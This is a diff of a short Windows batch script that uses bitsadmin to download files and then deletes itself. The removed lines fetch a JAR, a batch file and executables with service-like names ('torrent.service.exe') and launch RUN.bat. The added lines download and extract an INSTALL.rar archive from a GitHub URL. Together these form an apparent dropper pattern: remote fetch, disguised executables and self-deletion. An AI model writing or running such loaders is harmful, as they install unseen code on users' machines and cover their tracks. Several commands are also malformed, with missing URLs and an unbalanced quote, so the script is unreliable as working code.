@@ -1,6 +1,5 @@
-bitsadmin.exe /transfer /priority FOREGROUND "MASTER_JAR.jar" "%~dp0\MASTER_JAR.jar"
-bitsadmin.exe /transfer /priority FOREGROUND "RUN.bat" "%~dp0\RUN.bat"
-bitsadmin.exe /transfer /priority FOREGROUND "aria.torrent.service.exe" "%~dp0\aria.torrent.service.exe"
-bitsadmin.exe /transfer /priority FOREGROUND "ffmpeg.torrent.service.exe" "%~dp0\ffmpeg.torrent.service.exe"
-start cmd /c "RUN.bat"
-DEL "%~f0" && EXIT
+bitsadmin.exe /transfer /priority FOREGROUND "https://github.com/bugai66/MASTER_JAR/raw/master/INSTALL.rar "%~dp0\INSTALL.rar"
+"%~dp0\7z" e "INSTALL.rar"
+rem::start cmd /c "RUN.bat"
+DEL "%~f0"
+EXIT
